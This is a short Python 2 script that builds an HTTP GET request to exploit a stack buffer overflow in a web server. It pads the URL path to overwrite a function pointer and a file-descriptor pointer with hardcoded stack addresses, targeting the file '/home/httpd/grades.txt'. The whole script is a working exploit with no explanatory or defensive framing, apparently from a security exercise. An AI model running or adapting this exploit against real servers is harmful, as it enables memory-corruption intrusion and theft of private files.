#!/usr/bin/python
import urllib
import struct

stack_buffer = 0xbfffd9fc
funcpointer = 0xbfffddfc
fddir = 0xbfffde10
virgodir = 0x40102450

def build_exploit():
    command = "/home/httpd/grades.txt\0"
    direcc = "/"
    for x in xrange(0, funcpointer - stack_buffer - 16  ):
        direcc += "a"
    direcc += urllib.quote( struct.pack( "<I", virgodir ) )
    for x in xrange(0, fddir - funcpointer - 4 ):
        direcc += "m"
    direcc += urllib.quote( struct.pack( "<I", fddir+4 ) )
    direcc += urllib.quote(command)

    req =   "GET " + direcc + " HTTP/1.0\r\n" + \
            "\r\n"
    return req
